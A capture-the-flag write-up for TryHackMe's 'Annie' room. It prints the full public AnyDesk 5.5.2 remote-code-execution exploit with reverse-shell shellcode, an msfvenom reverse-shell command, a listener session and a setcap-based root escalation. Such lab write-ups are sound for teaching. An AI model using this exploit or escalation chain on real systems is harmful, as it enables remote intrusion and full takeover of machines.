# **Annie - TryHackMe**

*Target Ip. Address: 10.48.162.35*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.48.162.35
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-09 03:04 +0000
Nmap scan report for 10.48.162.35
Host is up (0.038s latency).
Not shown: 998 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d7:25:34:e8:07:b7:d9:6f:ba:d6:98:1a:a3:17:db (RSA)
|   256 72:10:26:ce:5c:53:08:4b:61:83:f8:7a:d1:9e:9b:86 (ECDSA)
|_  256 d1:0e:6d:a8:4e:8e:20:ce:1f:00:32:c1:44:8d:fe:4e (ED25519)
7070/tcp open  ssl/realserver?
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=AnyDesk Client
| Not valid before: 2022-03-23T20:04:30
|_Not valid after:  2072-03-10T20:04:30
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.36 seconds
```

Only 2 ports are open. Port 22 (ssh) and Port 7070 (running AnyDesk Client). We don't know the version of AnyDesk, so let's see if any exploits are avilable.

```bash
kali@kali:searchsploit anydesk
----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
AnyDesk 2.5.0 - Unquoted Service Path Privilege Escalation                         | windows/local/40410.txt
AnyDesk 5.4.0 - Unquoted Service Path                                              | windows/local/47883.txt
AnyDesk 5.5.2 - Remote Code Execution                                              | linux/remote/49613.py
AnyDesk 7.0.15 - Unquoted Service Path                                             | windows/local/51968.txt
AnyDesk 9.0.1 - Unquoted Service Path                                              | windows/local/52258.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

There are some exploits, but RCE sounds promising. Let's try that one.

```bash
kali@kali:cat 49613.py
# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import sys

ip = '192.168.x.x'
port = 50001

def gen_discover_packet(ad_id, os, hn, user, inf, func):
  d  = chr(0x3e)+chr(0xd1)+chr(0x1)
  d += struct.pack('>I', ad_id)
  d += struct.pack('>I', 0)
  d += chr(0x2)+chr(os)
  d += struct.pack('>I', len(hn)) + hn
  d += struct.pack('>I', len(user)) + user
  d += struct.pack('>I', 0)
  d += struct.pack('>I', len(inf)) + inf
  d += chr(0)
  d += struct.pack('>I', len(func)) + func
  d += chr(0x2)+chr(0xc3)+chr(0x51)
  return d

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.y.y LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\xcb\x46\x40"
shellcode += b"\x6c\xed\xa4\xe0\xfb\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\xa1\x6f\x18\xf5\x87"
shellcode += b"\xa6\xbf\x91\xca\x18\x4f\x69\xa5\x33\xa8\x42"
shellcode += b"\xc9\x46\x41\xd1\x2d\x0c\x96\xf8\x9a\x0e\xc9"
shellcode += b"\x8a\x87\xb4\xba\x91\xe1\x1e\x4f\x69\x87\xa7"
shellcode += b"\xbe\xb3\x34\x88\x2a\x4d\xb5\xab\xe5\x8e\x3d"
shellcode += b"\x2c\x7b\x34\x74\xec\x5b\xd4\xa9\x2f\x2e\x43"
shellcode += b"\x9e\xcc\xe0\xa8\x83\xcf\xa7\x3e\xba\xec\x69"
shellcode += b"\x1d\xc4\x43\x40\x6c\xed\xa4\xe0\xfb"

print('sending payload ...')
p = gen_discover_packet(4919, 1, '\x85\xfe%1$*1$x%18x%165$ln'+shellcode, '\x85\xfe%18472249x%93$ln', 'ad', 'main')
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.sendto(p, (ip, port))
s.close()
print('reverse shell should connect within 5 seconds')
```

So, let's generate the shellcode with msfvenom.

```bash
kali@kali:msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.130.26 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
Found 3 compatible encoders
Attempting to encode payload with 1 iterations of x64/xor
x64/xor succeeded with size 119 (iteration=0)
x64/xor chosen with final size 119
Payload size: 119 bytes
Final size of python file: 680 bytes
shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x63\xb1\x69"
shellcode += b"\x91\x31\xed\x2e\x27\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x09\x98\x31\x08\x5b"
shellcode += b"\xef\x71\x4d\x62\xef\x66\x94\x79\x7a\x66\x9e"
shellcode += b"\x61\xb1\x78\xcd\xf1\x45\xac\x3d\x32\xf9\xe0"
shellcode += b"\x77\x5b\xfd\x74\x4d\x49\xe9\x66\x94\x5b\xee"
shellcode += b"\x70\x6f\x9c\x7f\x03\xb0\x69\xe2\x2b\x52\x95"
shellcode += b"\xdb\x52\xc9\xa8\xa5\x95\x08\x01\xd8\x07\xbe"
shellcode += b"\x42\x85\x2e\x74\x2b\x38\x8e\xc3\x66\xa5\xa7"
shellcode += b"\xc1\x6c\xb4\x69\x91\x31\xed\x2e\x27"
```

Let's replace our shell code and edit the target Ip address. 

Set up a listener.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.11.65 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
```

Listener is up, let's start the exploit.

```bash
kali@kali:python2 49613.py                                                                                               
sending payload ...
reverse shell should connect within 5 seconds
```

Let's wait for the reverse shell.

```bash
kali@kali:penelope -p 4444
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.11.65 • 172.17.0.1 • 172.18.0.1 • 192.168.130.26
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from desktop~10.48.162.35-Linux-x86_64 😍 Assigned SessionID <1>
[+] Attempting to upgrade shell to PTY...
[+] Shell upgraded successfully using /usr/bin/python3! 💪
[+] Interacting with session [1], Shell Type: PTY, Menu key: F12 
[+] Logging to /home/kali/.penelope/sessions/desktop~10.48.162.35-Linux-x86_64/2026_03_09-02_50_55-218.log 📜
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

annie@desktop:/home/annie$ id
uid=1000(annie) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

We got a shell as user annie.

We find our first flag.

```bash
kali@kali:annie@desktop:/home/annie$ cat user.txt
THM{N0.....sk}
```

We find no sudo permissions, but we have interesting SUID binary for us.

```bash
kali@kali:annie@desktop:/home$ find / -perm -u=s 2>/dev/null
/sbin/setcap
/bin/mount
/bin/ping
/bin/su
/bin/fusermount
/bin/umount
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/xorg/Xorg.wrap
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/pkexec
```

setcap provides a mechanism for privilege escalation by indirectly enabling elevated privileges, such as setting the SUID bit or modifying the ownership of another executable.

So, let's add python to SUID.

```bash
kali@kali:annie@desktop:/home$ setcap cap_setuid+ep /usr/bin/python3.6
```

Let's verify, if that worked.

```bash
kali@kali:annie@desktop:/home$ getcap /usr/bin/python3.6
/usr/bin/python3.6 = cap_setuid+ep
```

That was a success, now we can escalte to root.

```bash
kali@kali:annie@desktop:/home$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# id
uid=0(root) gid=1000(annie) groups=1000(annie),24(cdrom),27(sudo),30(dip),46(plugdev),111(lpadmin),112(sambashare)
```

Let's get the final flag and end this challenge.

```bash
kali@kali:# cat root.txt
THM{0n.....sk}
```
